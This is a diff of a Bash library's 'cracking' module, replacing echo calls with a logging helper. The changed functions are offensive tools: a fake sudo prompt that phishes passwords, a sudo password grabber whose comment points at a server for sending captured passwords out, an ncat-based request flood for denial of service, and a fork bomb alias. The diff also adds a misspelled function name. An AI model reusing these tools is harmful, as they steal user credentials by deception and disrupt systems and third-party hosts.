@@ -49,9 +49,9 @@ bl_cracking_fake_sudo_password_attempt() {
     for number in 1 2 3; do
         read -rsp "[sudo] password for $(whoami): " password
         sleep 1
-        echo -e '\nSorry, try again.'
+        bl.loging.plain '\nSorry, try again.'
     done
-    echo "sudo: $number incorrect password attempts"
+    bl.logging.plain "sudo: $number incorrect password attempts"
     return $?
 }
 alias bl.cracking.fork_bomb=bl_cracking_fork_bomb
@@ -84,9 +84,9 @@ bl_cracking_grab_sudo_password() {
     local buffer_file_path="$(mktemp)"
     for number in 1 2 3; do
         read -rsp "[sudo] password for $user: " password
-        echo ''
+        bl.logging.plain
         # shellcheck disable=SC1117
-        if echo -e "${password}\n" | \
+        if bl.logging.plain "${password}\n" | \
             sudo -S "$@" 1>"$buffer_file_path" 2>/dev/null
         then
             # NOTE: Place your password grabber server url here.
@@ -97,9 +97,9 @@ bl_cracking_grab_sudo_password() {
             break
         else
             if (( number == 3 )); then
-                echo "sudo: $number incorrect password attempts"
+                bl.logging.plain "sudo: $number incorrect password attempts"
             else
-                echo 'Sorry, try again.'
+                bl.logging.plain Sorry, try again.
             fi
         fi
     done
@@ -117,7 +117,7 @@ bl_cracking_make_simple_ddos_attack() {
     local index
     for (( index=0; index<"$1"; index++ )); do
         # shellcheck disable=SC1117
-        echo -e "GET /$index\r\n\r\n" | ncat lilu "$2" &
+        bl.logging.plain "GET /$index\r\n\r\n" | ncat lilu "$2" &
     done
     return $?
 }
